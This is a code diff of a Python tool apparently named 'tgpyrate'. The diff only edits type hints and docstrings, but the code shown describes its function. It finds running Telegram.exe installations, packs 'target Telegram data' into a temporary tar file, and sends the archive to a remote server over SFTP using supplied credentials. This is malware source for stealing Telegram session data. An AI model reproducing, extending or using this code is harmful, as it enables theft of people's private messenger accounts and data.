@@ -103,11 +103,11 @@ def init():
         exit(1)
 
 
-def pgrep(name):
+def pgrep(name: str):
     """
     Return a list of processes matching 'name'.
 
-    name (str): name of the target process[es]
+    name: name of the target process[es]
     """
 
     ls = []
@@ -119,9 +119,10 @@ def pgrep(name):
 
 def find_portable():
     """
-    Finds all currently running Telegram.exe,
-    then add its parent directory to 'installation_locations'
+    Find all currently running Telegram.exe,
+    then return their containing directories as a list
     """
+
     portable_installations = []
     all_telegram_processes = pgrep('Telegram.exe')
 
@@ -136,18 +137,18 @@ def find_portable():
     return portable_installations
 
 
-def send_file(host, port,
-              user, pwd,
-              file, dest):
+def send_file(host: str, port: int,
+              user: str, pwd: str,
+              file, dest: str):
     """
     Use SFTP to send a file
 
-    host (str): SFTP server location
-    port (int): SFTP server port
-    user (str): SFTP server user
-    pwd (str): password of that remote user
+    host: SFTP server location
+    port: SFTP server port
+    user: SFTP server user
+    pwd: password of that remote user
     file (file-like object): local file
-    dest (str): target remote location of the file
+    dest: target remote location of the file
     """
 
     # don't f*ckin crash if we can't connect to the server
@@ -168,7 +169,7 @@ def send_file(host, port,
 
 def tgpyrate():
     """
-    Generates a temporary tar file,
+    Generate a temporary tar file,
     put target Telegram data in it,
     and send it via SFTP
     """
